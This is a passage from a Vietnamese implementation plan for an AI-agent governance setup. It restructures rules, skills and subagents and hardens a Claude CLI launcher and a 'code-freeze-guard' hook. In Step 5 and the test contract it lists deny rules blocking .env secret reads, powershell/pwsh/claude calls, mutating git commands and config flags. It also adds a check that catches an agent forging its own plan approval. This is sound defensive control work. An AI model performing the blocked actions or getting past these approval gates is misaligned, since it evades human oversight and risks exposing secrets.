| **`.agents/rules/05-plan-review.md`** | **7. Pre-Flight Gate (§6) & `@qa` (§7)** (`dòng 96–108`)                              | Giữ nguyên đủ 3 cổng kiểm tra Pre-Flight Gate (Gate 1 Plan Persistence, Gate 2 Reviewer Dispatch, Gate 3 Reviewer Approval Token) và mô tả vai trò độc lập On-Demand của `@qa` (`[QA_PASSED]` / `[QA_FAILED]`).                                                                                                                                                                                                                                                                                                         |

---

### 7. Các Bước Thực Hiện Tuần Tự

- [ ] **Bước 1 — Tạo mới 2 Skills từ Workflows và xóa thư mục `.agents/workflows/`**:
  - Tạo `.agents/skills/vikini-debug/SKILL.md` với YAML frontmatter (`name: vikini-debug`, `description: "MANDATORY when debugging complex or recurring bugs (/debug) or executing the post-fix verification and lesson-recording protocol (/post-fix)."`), hợp nhất đầy đủ quy trình 5 bước của `.agents/workflows/debug.md` (Check Past Lessons, Understand Before Touching, Trace Data Flow, Minimal Fix + Co-located Test, 3-Strike Circuit Breaker) và 4 bước của `.agents/workflows/post-fix.md` (`npm run verify`, ghi `docs/lessons-learned.md`, cập nhật `docs/CHANGELOG.md`, tóm tắt root cause).
  - Tạo `.agents/skills/vikini-audit/SKILL.md` với YAML frontmatter (`name: vikini-audit`, `description: "MANDATORY when performing a focused code quality, architecture boundary, UI token, or bilingual compliance audit (/audit) on a file or feature area."`), chuyển toàn bộ 5 bước kiểm toán từ `.agents/workflows/audit.md`.
  - Xóa 3 file `.agents/workflows/debug.md`, `.agents/workflows/post-fix.md`, `.agents/workflows/audit.md`.

- [ ] **Bước 2 — Chuẩn hóa 3 Subagents (`.agents/agents/*/agent.md`) & 2 File Vệ Tinh Reviewer (`B1`, `M1`, `M2`)**:
  - Cập nhật `.agents/agents/planner/agent.md`:
    - Sửa YAML frontmatter (dòng 1–18): đổi `model: gemini-4-argon` thành `model: pro`, xóa dòng `role: Fallback Technical Planner`. Giữ nguyên nhãn `[PLANNER_MODEL: gemini-4-argon]` ở dòng 21 và dòng 26.
    - Tại Bước 0 (dòng 30): xóa yêu cầu tự đọc lại `.agents/agents/planner/agent.md`, nhưng **GIỮ NGUYÊN** yêu cầu đọc `.agents/rules/02-quality.md` (`M2`), khảo sát các file mã nguồn/tài liệu liên quan đến task và đọc các `SKILL.md` theo bảng Pre-Work Protocol.
    - Tại dòng 57: đổi `.agents/workflows/debug.md` thành `.agents/skills/vikini-debug/SKILL.md`.
  - Cập nhật `.agents/agents/reviewer/agent.md`:
    - Sửa YAML frontmatter (dòng 1–20): đổi `model: gemini-4-argon` thành `model: pro`, xóa dòng `role: Primary Lead Architecture Reviewer`, xóa `- write_to_file` khỏi danh sách `tools:` (giữ `view_file`, `list_dir`, `grep_search`, `find_by_name`, `replace_file_content`, `run_command`, `search_web`, `read_url_content`).
    - Tại Bước 0 (dòng 35–42): xóa mục tự đọc `.agents/agents/reviewer/agent.md`, chỉ giữ đọc 3 file vệ tinh (`allowlist.md`, `evidence-bar.md`, `mental-simulation.md`) và các `SKILL.md` thuộc domain của plan.
    - Tại dòng 82: thay gợi ý `node -e` / `npx tsx -e` bằng `npx tsc --noEmit`, `npx vitest run <path>`, hoặc `node scripts/verify-docs.mjs`.
    - Tại mục Ràng Buộc Bắt Buộc (dòng 120): ghi rõ chỉ dùng `replace_file_content` (hoặc bí danh `edit_file`) để cập nhật trạng thái Header và nối thêm `### Audit Run [X+1]` vào `docs/plans/*.md`.
    - Tinh giản câu chữ trùng lặp để tổng dung lượng `.agents/agents/reviewer/agent.md` đạt `< 7,500 chars` (giảm từ `9,779 chars`), giữ nguyên 100% logic thẩm định.
  - Cập nhật `.agents/agents/qa/agent.md` (`M1`):
    - Sửa YAML frontmatter (dòng 1–17): đổi `model: claude-4.6-opus` thành `model: pro`, xóa dòng `role: Lead QA, Bug Hunter & Code Auditor`.
    - Tại mục Cơ Chế Runtime Model & Fallback (dòng 131–137): xóa bỏ hoàn toàn `claude-4.6-opus`; giải thích rõ `model: pro` chọn phân tầng Pro của phiên hiện tại (khuyến nghị User/PM chọn `Claude Opus 5.5 (thinking)` hoặc `Gemini 4 Argon` trong thanh chọn model khi gọi `@qa`), và quy định báo cáo `@qa` phải ghi nhận chính xác model thực tế đang chạy trong phiên (`[QA_MODEL: claude-opus-5-5]` hoặc `[QA_MODEL: gemini-4-argon]` / `[FALLBACK_MODEL: gemini-4-argon]`).
  - Cập nhật `.agents/agents/reviewer/allowlist.md` và `.agents/agents/reviewer/evidence-bar.md`:
    - Trong `.agents/agents/reviewer/allowlist.md`: xóa lệnh mẫu có pipe `| npx eslint --stdin` (dòng 19) và mục 3 `node -e` / `npx tsx -e` (dòng 22–25); bổ sung `node scripts/verify-docs.mjs` vào danh sách lệnh allowlist hợp lệ.
    - Trong `.agents/agents/reviewer/evidence-bar.md`: tại §4.5.1 (dòng 21) đổi gợi ý `node -e` / `npx tsx -e` thành chạy unit test co-located qua `npx vitest run <path>`; tại §4.5.3 (dòng 47–51) ghi rõ `npx eslint --print-config <path>`, `npx tsc --showConfig`, `npx tsc --noEmit` dùng để chứng minh **Wiring & Baseline**, còn **Negative Probe** hợp lệ là thực thi các test case âm tính qua `npx vitest run <path>` hoặc bước Negative Probe tường minh trong Verification Plan / Test Contract.

- [ ] **Bước 3 — Tái cấu trúc `.agents/rules/` theo Progressive Disclosure, Ma Trận Bảo Toàn Quy Chuẩn & Model Roster Tháng 10/2026 (`M3`, `M5`, `MIN-03`, `Minor 2, 3, 5`)**:
  - Cập nhật `.agents/rules/00-core.md` (`trigger: always_on`, mục tiêu `~4,500 chars`):
    - Sửa mục Git Rules (dòng 42 và dòng 52–58): phân tách rõ **BANNED Mutating Git Commands** (`git add`, `git commit`, `git push`, `git checkout`, `git switch`, `git branch`, `git reset`, `git stash`, `git merge`, `git rebase`) và **ALLOWED Read-Only Git Inspection** (`git status`, `git diff`, `git log -n <N>`, `git show`, `git blame`).
    - Thêm mục **Core Coding & Testing Invariants** (~1,000 chars) tóm tắt các quy tắc bất biến từ `01-coding.md`: TypeScript strict mode (`any` bị cấm tuyệt đối, bắt buộc dùng `unknown` + type narrowing), cấm `console.log` (chỉ dùng `console.warn`/`console.error`), bắt buộc có co-located unit test (`*.test.ts`) khi thêm/sửa logic trong `src/lib/core/`, `src/lib/features/`, `.agents/scripts/`, hiển thị `toast.error()` cho lỗi tác vụ người dùng, và giới hạn kích thước file 150–400 dòng (tối đa 500 dòng).
  - Cập nhật `.agents/rules/01-coding.md` (`M3`):
    - Đổi YAML frontmatter (dòng 1–4) sang:
      ```yaml
      ---
      trigger: glob
      globs: "*.ts, *.tsx, *.js, *.mjs, **/*.ts, **/*.tsx, **/*.js, **/*.mjs"
      description: Coding standards, TypeScript discipline, error handling, testing, and code organization rules.
      ---
      ```
    - Tại dòng 93: đổi `> Optimized for AI agent comprehension (Claude Opus 4.6 / 5.5, Gemini 4 Argon, Gemini 3.1 Pro).` thành `> Optimized for AI agent comprehension (Gemini 4 Argon, Claude Opus 5.5, Claude Sonnet 5.5, Gemini 3.8 Flash).`.
  - Cập nhật `.agents/rules/02-quality.md` (`trigger: always_on`, thu gọn từ `11,044 chars` xuống `~6,500 chars` theo Ma Trận Bảo Toàn Quy Chuẩn tại Mục 6.4):
    - Cập nhật đầy đủ cả **5 vị trí** tham chiếu `.agents/workflows/`:
      1. Dòng 19 (Pre-Work table): `.agents/workflows/debug.md` ➔ `.agents/skills/vikini-debug/SKILL.md`.
      2. Dòng 30 (Pre-Work table): `.agents/workflows/audit.md` ➔ `.agents/skills/vikini-audit/SKILL.md`.
      3. Dòng 41 (Skill Precedence Hierarchy): `.agents/workflows/` ➔ `.agents/skills/`.
      4. Dòng 99 (Audit Định Kỳ): `.agents/workflows/audit.md` ➔ `.agents/skills/vikini-audit/SKILL.md`.
      5. Dòng 140 (Debugging Protocol): `.agents/workflows/debug.md` ➔ `.agents/skills/vikini-debug/SKILL.md`.
    - Sửa dòng 108 (`MIN-03`, `Minor 2, 3`): thay `- Chuẩn API Route Architecture: .agents/skills/api-patterns/SKILL.md (Validate → Execute → Respond, requireUser()).` thành `- Chuẩn API Route Architecture: .agents/skills/api-patterns/SKILL.md (Validate → Execute → Respond, await auth() + UnauthorizedError hoặc requireUser() tại /api/conversations/**, /api/files/**, /api/messages/**, /api/user-templates/**).` (không ghi cứng số lượng route để tránh doc drift).
    - Tinh giản câu chữ diễn giải ở các mục nhưng giữ đủ 100% 8 nhóm quy chuẩn bắt buộc trong Mục 6.4.
  - Cập nhật `.agents/rules/03-ui.md` (`M3`, `Minor 5`):
    - Đổi YAML frontmatter (dòng 1–4) sang:
      ```yaml
      ---
      trigger: glob
      globs: "*.tsx, *.css, **/*.tsx, **/*.css"
      description: UI/UX design system, styling tokens, and component conventions.
      ---
      ```
    - Ở cuối file `.agents/rules/03-ui.md`, chỉ thêm 1 dòng liên kết ngắn: `For bilingual UI text requirements (VI/EN), see .agents/rules/04-bilingual.md and .agents/skills/add-translation/SKILL.md.` (không sao chép lặp lại nội dung của `04-bilingual.md`).
  - Cập nhật `.agents/rules/04-bilingual.md`:
    - Sửa dòng 14 từ `lib/utils/translations/` thành `src/lib/utils/translations/`.
  - Cập nhật `.agents/rules/05-plan-review.md` (`trigger: always_on`, thu gọn từ `10,749 chars` xuống `~6,500 chars` theo Ma Trận Bảo Toàn Quy Chuẩn tại Mục 6.4):
    - Tại §1.1 (dòng 28): ghi rõ công cụ áp dụng là `replace_file_content` (hoặc `edit_file`).
    - Tại §3.1 (dòng 60): bỏ `write_to_file` khỏi công cụ của `@reviewer` (chỉ dùng `replace_file_content` / `edit_file` trên file kế hoạch đã có), và tại §3.2 ghi rõ `run-claude.ps1 -Role reviewer` gắn `PreToolUse` hook `code-freeze-guard.js` qua `--settings` (`"onFailure": "block"`), chỉ cấp quyền `Edit(docs/plans/*.md)` và thu hồi công cụ `Write` ở cấp độ tool trong `--disallowedTools` (`BLK-03`, `MAJ-04`, `MAJ-10`, `MAJ-12`).
    - Tại §5 (dòng 91–95): cập nhật cơ chế **Plan Lifecycle, Date-Prefix Ordering & Single-Step Pre-Approved Plan Guard**: ghi rõ `docs/plans/*.md` là Single Source of Truth duy nhất (đã xóa bỏ hoàn toàn nhánh legacy `.agents/.plan-approved` — `MAJ-07`), `code-freeze-guard.js` lọc bỏ các tiền tố ngày tương lai `> UTC today + 1 day` (`MIN-04`), sắp xếp kế hoạch theo tiền tố ngày `YYYY-MM-DD` giảm dần (dùng `mtimeMs` làm tie-breaker), khóa fail-safe nếu có bất kỳ kế hoạch nào trong ngày mới nhất đang chờ duyệt (`Ready for Review` / `Changes Requested`), chỉ mở khóa khi kế hoạch được duyệt có `- **Status**: Approved` ở 30 dòng đầu VÀ dòng không rỗng cuối cùng là `[PLAN_APPROVED]`, chặn tạo mới/ghi đè toàn bộ file kế hoạch đã gắn sẵn phê duyệt qua `write_to_file`/`write_file` (Single-Step Pre-Approved Plan Guard), và yêu cầu cập nhật Header sang `- **Status**: Completed` ở bước cuối cùng sau khi hoàn tất task để khóa lại repo.

- [ ] **Bước 4 — Cập nhật `.gitignore`, `scripts/verify-docs.mjs`, Docs Drift & Archive `docs/CHANGELOG.md` (Thực Hiện TRƯỚC Khi Thay Đổi `isPlanApproved()` Trong `code-freeze-guard.js` — `MAJ-07`, `MAJ-11`, `MIN-03`, `Minor 4, 6`)**:
  - **Lý do thứ tự thực thi (`MAJ-11`)**: `scripts/verify-docs.mjs` nằm ngoài `.agents/**` và `docs/**`, nên đi qua Gate 8 của `code-freeze-guard.js` (đòi hỏi `isPlanApproved() === true`). Khi Bước 4 chạy trước Bước 5, hàm `isPlanApproved()` hiện tại trên đĩa (sắp xếp theo `mtimeMs`) vẫn đang hoạt động và trả về `true` cho bản kế hoạch `2026-10-19-remake-agents-governance-v2-implementation-plan.md` vừa được duyệt, giúp cập nhật `scripts/verify-docs.mjs` trơn tru ngay cả khi trong `docs/plans/` đang có file untracked `2026-10-23-strata-local-llm-implementation-plan.md` (`Status: Ready for Review`).
  - Cập nhật `.gitignore` (`MAJ-07`, `Minor 6`):
    - **Không** thêm `.agents/.plan-approved` vào `.gitignore` (vì nhánh legacy này sẽ bị xóa bỏ hoàn toàn khỏi `code-freeze-guard.js` ở Bước 5 theo `MAJ-07`).
    - Chỉ bổ sung `!.agents/skills/vikini-debug/` và `!.agents/skills/vikini-audit/` vào danh sách unignore của Vikini-owned skills (giữ nguyên trạng thái ignore cho 3 third-party skills `animation-vocabulary`, `emil-design-eng`, `review-animations`).
  - Cập nhật `scripts/verify-docs.mjs`:
    - Tại `[2/5]` (`legacyPatterns`, dòng 107–124): thêm `{ name: ".agents/workflows/ (deprecated)", regex: /\.agents\/workflows\// }` và bỏ qua các file lịch sử trong `docs/plans/` (trừ `docs/plans/README.md`) giống như cổng `[1/5]` (`if (rel.startsWith("docs/plans/") && rel !== "docs/plans/README.md") continue;`).
    - Tại `[3/5]` (dòng 145–149): xóa `rel.startsWith(".agents/workflows/") ||` khỏi điều kiện lọc file cần quét.
  - Sửa doc drift trong:
    - `.agents/skills/add-model/SKILL.md`: sửa dòng 12 và 28 (`lib/core/modelRegistry.ts` ➔ `src/lib/core/modelRegistry.ts`), sửa dòng 37 (`lib/utils/config.ts` ➔ `src/lib/utils/translations/vi.ts` và `src/lib/utils/translations/en.ts`).
    - `.agents/skills/add-translation/SKILL.md`: sửa dòng 12, 25, 31 (`lib/utils/translations/` ➔ `src/lib/utils/translations/`).
    - `.agents/skills/README.md` (mục 1.C, mục 2, dòng 17, 47 — ghi nhận cả `await auth()` + `UnauthorizedError` và `requireUser()` tại `/api/conversations/**`, `/api/files/**`, `/api/messages/**`, `/api/user-templates/**`, không ghi cứng số lượng route — `MIN-03`).
    - `.agents/README.md` (cập nhật Mục 2 Rules Catalog với `*.ext, **/*.ext`; bổ sung dòng `@qa` vào bảng Mục 4.1 Model Routing kèm giải thích `model: pro` và chú thích `***` của `Gemini 4 Argon`).
    - `.agents/scripts/claude-planner-prompt.md` (dòng 20, 64), và `docs/lessons-learned.md` (dòng 5).
  - Archive `docs/CHANGELOG.md` sang `docs/archive/CHANGELOG-legacy.md` (`Minor 4`):
    - Di chuyển 32 mục changelog cũ (từ ngày `2026-10-15` trở về trước, tức `<= 2026-10-15`, dòng 122–847 của `docs/CHANGELOG.md`) sang đầu phần entries của `docs/archive/CHANGELOG-legacy.md`.
    - Cập nhật dòng ghi chú mốc ngày lưu trữ tại `docs/CHANGELOG.md:7` và `docs/archive/CHANGELOG-legacy.md:3` thành **"từ ngày `2026-10-15` trở về trước (`<= 2026-10-15`)"**.
    - Thêm mục changelog mới `## 2026-10-19: Governance -- Remake Hệ Thống Governance 2.0 (Rules, Subagents, Hooks & Skills)` vào đầu `docs/CHANGELOG.md` (tổng số headings trên 2 file = `7` current + `106` legacy = `113`).

- [ ] **Bước 5 — Gia cố 4 Lớp cho `.agents/scripts/run-claude.ps1`, `.agents/scripts/code-freeze-guard.js`, `.agents/hooks.json`, Unit Tests, Chạy Verification Suite + End-to-End CLI Smoke Probe & Đóng Trạng Thái `Completed` Cho Cả 4 Kế Hoạch Ngày `2026-10-19` (`BLK-02`..`BLK-04`, `MAJ-04`..`MAJ-12`, `MIN-04`..`MIN-07`, `B1`, `B2`, `M4`, `Minor 7, 8`)**:
  - Cập nhật `.agents/hooks.json`: đổi `matcher` tại dòng 5 thành `"write_to_file|replace_file_content|multi_replace_file_content|write_file|edit_file|run_command"`.
  - Cập nhật `.agents/scripts/run-claude.ps1` (`BLK-02`..`BLK-04`, `MAJ-04`, `MAJ-05`, `MAJ-08`, `MAJ-10`, `MAJ-12`, `MIN-05`, `MIN-06`, `B1` — như Mục 6.3):
    1. Thêm bước kiểm tra bảo mật `$ArtifactFile` (nếu khác rỗng — `MIN-05`): bắt buộc `[System.IO.Path]::IsPathRooted($ArtifactFile.Trim())` (nếu tương đối báo lỗi `[INVALID_ARTIFACT_PATH]` và `exit 43`), phân giải đường dẫn tuyệt đối `$resolvedArtifactFile`, bắt buộc nằm trong `$env:USERPROFILE\.gemini\antigravity\brain\`, không chứa `..` và có đuôi `.md` (nếu sai `exit 43`), và dùng `$resolvedArtifactFile` ở tất cả các lệnh `Split-Path -Parent $resolvedArtifactFile`, `New-Item`, và `Copy-Item -LiteralPath $relPlanFile -Destination $resolvedArtifactFile -Force`.
    2. Tại dòng 140, 149, 153: xóa bỏ hoàn toàn `--dangerously-skip-permissions`; thay bằng `--permission-mode dontAsk`, `--settings $claudeHookSettings` (gắn `node .agents/scripts/code-freeze-guard.js` làm `PreToolUse` hook với `"onFailure": "block"` cho `Write|Edit|MultiEdit|Bash|Read` — **Lớp 1** `BLK-03`, `BLK-04`, `MAJ-10`, `MAJ-12`), kèm `--allowedTools` và `--disallowedTools` chuẩn Claude Code CLI:
       - **Lớp 2 (`BLK-03`, `BLK-04`, `MAJ-04`)**: Thu hẹp quyền sửa file thành `Edit(docs/plans/*.md)` cho cả `planner` và `reviewer`; với `reviewer` thêm `Write` trần vào `--disallowedTools`.
       - **Lớp 3 (`BLK-03`, `MAJ-05`)**: Khai báo `$sharedAllowedBash` đồng bộ với Nhóm A–D của `allowlist.md` và có dấu cách tường minh trước `*` cho mọi rule tiền tố (`Bash(git diff *)`, `Bash(git log *)`, `Bash(git show *)`, `Bash(git status *)`, `Bash(git blame *)`, `Bash(npm ls *)`, `Bash(node scripts/verify-docs.mjs *)`, `Bash(npm run test:run *)`).
       - **Lớp 4 (`BLK-02`, `BLK-03`, `MAJ-04`, `MAJ-08`, `MIN-06`)**: Khai báo `$sharedDisallowed` chặn `Read(.env*),Read(**/.env*)` (`MAJ-08`), chặn `Edit(src/**),Edit(.agents/**),Edit(scripts/**),Edit(supabase/**),Edit(tests/**)` (`MAJ-04`), chặn `Bash(powershell *),Bash(pwsh *),Bash(claude *)` (`MIN-06`), chặn `Bash(git difftool*),Bash(* --config*),Bash(* -c *),Bash(* --root*),Bash(* --dir*),Bash(* --globalSetup*),Bash(* --setupFiles*),Bash(* --extcmd*)` (`BLK-03`), chặn các cờ ghi file (`Bash(git * --output*),Bash(* --output=*),Bash(* --output *),Bash(* --outputFile*),Bash(* --fix*),Bash(* --write*),Bash(* -u),Bash(* -u *),Bash(* --update*),Bash(* --coverage*)` — `BLK-02`), và chặn toàn bộ lệnh git mutating.
  - Cập nhật `.agents/scripts/code-freeze-guard.js` (ES Module):
    1. Trong `READ_ONLY_COMMANDS` (dòng 51–65) & `MUTATING_FLAGS` (dòng 71):
       - Siết chặt regex `run-claude.ps1` (dòng 63) để chỉ cho phép các cờ hợp lệ và `-ArtifactFile` nằm trong `.gemini/antigravity/brain/*.md` (không có `..`) như Mục 6.2.
       - Thay thế `/^claude(?:\.exe)?(?:\s+.*)?$/` (dòng 64) bằng `/^claude(?:\.exe)?\s+(?:--version|-v|--help|-h|-p\s+["']?ping["']?)$/i`.
       - Thêm `/^node\s+["']?(?:\.[\/\\])?scripts[\/\\]verify-docs\.mjs["']?(?:\s+(?:--strict-shorthand|--expected-headings=\d+))*$/` (`Minor 7`).
       - Mở rộng `MUTATING_FLAGS` (dòng 71) thành `/(?:^|\s)(?:--fix|--write|--force|--output|--outputFile|--config|--root|--dir|--globalSetup|--setupFiles|--extcmd|--update|--coverage)(?:\s|=|$)|(?:^|\s)-(?:c|u|i)(?:\s|=|$)/` (`BLK-03`, `MIN-07`).
    2. Cài đặt và export trực tiếp 7 hàm thuần ESM dùng chung (`Minor 8`, `M4`, `MIN-04`, `BLK-03`, `BLK-04`, `MAJ-10`, `MAJ-12`): `hasApprovedPlanHeader`, `hasCompletedPlanHeader`, `hasApprovedPlanFooter`, `evaluatePlanApprovalContent`, `isSelfForgedPlanWrite`, `evaluateLatestDateGroupPlans(planEntries, options = {})` (có lọc `item.datePrefix <= maxDatePrefix`), và `formatHookOutput(result, rawPayload)` (khi `root.hook_event_name === "PreToolUse"`, nếu `result.decision === "allow"` trả về `null` để không ghi stdout và exit `0`; nếu khác `"allow"` thì trả về `{ hookSpecificOutput }` không có trường `decision` cấp gốc và ánh xạ sang `"deny"` dưới `dontAsk` mode — `BLK-04`, `MAJ-10`, `MAJ-12`) như Mục 6.1–6.2.
    3. Cập nhật `export function isPlanApproved()` (dòng 176–233): **xóa bỏ hoàn toàn khối kiểm tra `.agents/.plan-approved` (dòng 176–191 — `MAJ-07`)**, giữ nguyên từ khóa `export` và dùng `path.join(REPO_ROOT, "docs", "plans")` (`MAJ-09`), đọc danh sách file `.md` (khác `README.md`) thành mảng `{ filename, mtimeMs, content }` và gọi `return evaluateLatestDateGroupPlans(planEntries);` như Mục 6.1.
    4. Cập nhật `isFastTrackEligible(relative, input)` (dòng 418): chấp nhận `input.toolName === "replace_file_content" || input.toolName === "edit_file"`.
    5. Cập nhật `decide(input, options = {})`:
       - Ở đầu nhánh `if (input.targetFile)`: nếu `input.toolName === "Read" || input.toolName === "read_file" || input.toolName === "view_file"`, chặn mọi đường dẫn có basename khớp `/^\.env(?:\..+)?$/i` hoặc `relative.startsWith(".env") || relative.includes("/.env")` bằng `ask("⚠️ Code Freeze Guard: reading .env* secret files is prohibited...")`, và cho phép `{ decision: "allow" }` với các file thường (`MAJ-08`).
       - Tại Gate 3 (`if (unfrozen)`): (a) mở rộng kiểm tra đuôi `.md` cho **toàn bộ `UNFROZEN_PREFIXES` (`docs/**`) và `UNFROZEN_FILES`**: nếu `!relative.toLowerCase().endsWith(".md")`, trả về `ask("⚠️ Code Freeze Guard: only .md files are allowed inside unfrozen documentation paths (${relative}).")` (`BLK-03`, `BLK-04`); (b) nếu `(relative === "docs/plans" || relative.startsWith("docs/plans/")) && (input.toolName === "write_to_file" || input.toolName === "write_file" || input.toolName === "Write") && isSelfForgedPlanWrite(input.newContent)`, trả về `ask(...)` (như Mục 6.2).
    6. Cập nhật `extractInput(payload)` (dòng 634–696) & `main()` (dòng 700–720): hỗ trợ thêm `args.Path`, `args.Content`, `args.Replacement`, `args.Target`, và `args.new_string` / `args.old_string` (cho `Edit` của Claude CLI — `BLK-03`); đọc `oldContent` từ đĩa khi `toolName === "write_to_file" || toolName === "write_file" || toolName === "Write"`; trong `main()`, lưu `let parsedPayload;` trước khi gọi `decide()`, sau đó gọi `const output = formatHookOutput(result, parsedPayload); if (output !== null) { process.stdout.write(JSON.stringify(output)); }` (`BLK-04`, `MAJ-10`, `MAJ-12`).
  - Cập nhật `.agents/scripts/code-freeze-guard.test.ts`:
    - Giữ nguyên import `isPlanApproved` ở dòng 12 và test tích hợp `isPlanApproved()` ở dòng 595–598 (`MAJ-09`); import thêm `hasApprovedPlanHeader`, `hasCompletedPlanHeader`, `hasApprovedPlanFooter`, `evaluatePlanApprovalContent`, `isSelfForgedPlanWrite`, `evaluateLatestDateGroupPlans`, `formatHookOutput` từ `./code-freeze-guard.js`.
    - Thêm các describe/test blocks kiểm tra đầy đủ `TC-01`..`TC-08` (bao gồm kiểm thử `formatHookOutput` trả về `null` khi `hook_event_name === "PreToolUse"` và `result.decision === "allow"` — `MAJ-12`, trả về `permissionDecision: "deny"` khi `ask` dưới `dontAsk` và `expect(out).not.toHaveProperty("decision")` — `MAJ-10`; chặn đọc `.env` / `.env.local` qua `Read`/`read_file`/`view_file` — `MAJ-08`; chặn ghi `docs/plans/x.test.mjs` và `docs/notes/x.test.mjs` — `BLK-03`, `BLK-04`; cho phép `npx vitest run src/lib/features/chat/batch-c.test.ts` nhưng chặn `git difftool -y -x ...` và `npx vitest run --config ...` / `npx vitest run -c ...` / `npx eslint -c ...` — `BLK-03`, `MIN-07`; thứ tự `YYYY-MM-DD` vs `mtimeMs` bao gồm cả `TC-02(g)` khi nhóm `2026-10-19` `Approved` và nhóm `2026-10-23` `Ready for Review` trả về `false` — `MAJ-11`; lọc bỏ ngày tương lai `2099-01-01-x.md` — `MIN-04`; cả 4 kế hoạch ngày `2026-10-19` cùng `Completed` trả về `false` — `MAJ-06`; tên tool mới `write_file`/`edit_file`; chặn `run-claude.ps1` truyền `-ArtifactFile` không hợp lệ).
  - Chạy toàn bộ cổng kiểm chứng chất lượng (`npm run type-check`, `npm run lint`, `npx vitest run .agents/scripts/code-freeze-guard.test.ts`, `npm run test:run`, `node scripts/verify-docs.mjs --strict-shorthand --expected-headings=113`) và thực thi **End-to-End CLI Smoke Probe (`Wiring Probe 4` — `MAJ-12`)**.
  - **Thao tác cuối cùng (Đóng trạng thái `Completed` cho đầy đủ cả 4 kế hoạch ngày `2026-10-19` — `MAJ-06`, `MAJ-11`)**:
    1. Cập nhật `docs/plans/README.md` (đánh dấu `Completed` cho đầy đủ cả 4 kế hoạch ngày `2026-10-19`).
    2. Cập nhật Header (dòng 4) của `docs/plans/2026-10-19-pstack-skills-and-fast-track-implementation-plan.md` từ `- **Status**: Approved` sang `- **Status**: Completed`.
    3. Cập nhật Header (dòng 4) của `docs/plans/2026-10-19-swap-planner-reviewer-workflow-implementation-plan.md` từ `- **Status**: Approved` sang `- **Status**: Completed`.
    4. Cập nhật Header (dòng 4) của `docs/plans/2026-10-19-vitest-upgrade-and-add-model-skill.md` từ `- **Status**: Approved` sang `- **Status**: Completed`.
    5. Cập nhật Header (dòng 4) của `docs/plans/2026-10-19-remake-agents-governance-v2-implementation-plan.md` từ `- **Status**: Approved` sang `- **Status**: Completed` để `isPlanApproved()` tất định trả về `false` và tự động khóa lại Code Freeze Guard cho nhiệm vụ tiếp theo (dù file untracked `2026-10-23-strata-local-llm-implementation-plan.md` có `Status: Ready for Review` còn nằm trong `docs/plans/` hay được dọn đi — `MAJ-06`, `MAJ-11`).

---

### 8. Test Contract (Hợp Đồng Kiểm Thử Bắt Buộc)

| ID        | Thành phần / Hàm                                                                                                                                                                                         | Input                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               | Expected Output                                                                                                                                                                                                                                                                                                                                                                                                                                                     | Failure Modes / Boundary Conditions                                                                                                                                                                                                                                                                                                                                                                                                |
| :-------- | :------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | :---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | :------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | :--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------- | --- | ------- | --- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **TC-01** | `hasApprovedPlanHeader`, `hasApprovedPlanFooter`, `evaluatePlanApprovalContent`                                                                                                                          | Markdown plan có `- **Status**: Approved` ở dòng 4 và dòng cuối cùng là `[PLAN_APPROVED]` (kèm dòng trống phía sau).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                | `true`                                                                                                                                                                                                                                                                                                                                                                                                                                                              | Chấp nhận cả `- **Status**: Approved` và `- **Trạng thái**: Approved` (không phân biệt hoa/thường), chịu được CRLF (`\r\n`) và LF (`\n`).                                                                                                                                                                                                                                                                                          |
| **TC-02** | `evaluatePlanApprovalContent`, `evaluateLatestDateGroupPlans` & `export function isPlanApproved()` (`M4`, `MAJ-06`, `MAJ-07`, `MAJ-09`, `MAJ-11`, `MIN-04`)                                              | (a) Plan có `- **Status**: Completed` nhưng dòng cuối vẫn còn `[PLAN_APPROVED]`; (b) Mảng 2 plan cùng ngày `2026-10-19` trong đó 1 plan `Status: Approved` và 1 plan mới tạo `Status: Ready for Review`; (c) Plan ngày `2026-10-08` (`Approved`, `mtimeMs` cao hơn sau `git clone`) và plan ngày `2026-10-19` (`Ready for Review`, `mtimeMs` thấp hơn); (d) Mảng 4 plan ngày `2026-10-19` đều ở trạng thái `Status: Completed` (`MAJ-06`); (e) Plan giả mạo có tiền tố ngày tương lai `2099-01-01-x.md` (`Status: Approved`) khi `maxDatePrefix: "2026-10-20"` và các plan `2026-10-19` đã `Completed` (`MIN-04`); (f) Gọi trực tiếp `isPlanApproved()` (giữ nguyên test tích hợp tại `.agents/scripts/code-freeze-guard.test.ts:595-598` — `MAJ-09`); (g) Plan ngày `2026-10-19` (`Status: Approved`, `mtimeMs` cao hơn) và plan ngày `2026-10-23` (`Status: Ready for Review`, `mtimeMs` thấp hơn — kịch bản có `2026-10-23-strata-local-llm-implementation-plan.md` — `MAJ-11`). | Cả (a), (b), (c), (d), (e), (g) đều trả về `false`. Ngược lại, nếu ngày `2026-10-19` có 3 plan `Status: Completed` và 1 plan `Status: Approved` (không có plan ngày mới hơn và không có plan pending), trả về `true`; `typeof isPlanApproved() === "boolean"`.                                                                                                                                                                                                      | **Boundary (`M4`, `MAJ-06`, `MAJ-07`, `MAJ-09`, `MAJ-11`, `MIN-04`)**: Lọc bỏ mọi file không có tiền tố `YYYY-MM-DD` hợp lệ hoặc có `datePrefix > maxDatePrefix`; ưu tiên tiền tố ngày `YYYY-MM-DD` trước `mtimeMs`; khóa fail-safe ngay lập tức nếu bất kỳ plan nào của ngày mới nhất đang chờ duyệt (`!Completed && !Approved`); `export function isPlanApproved()` dùng `REPO_ROOT` và không còn đọc `.agents/.plan-approved`.  |
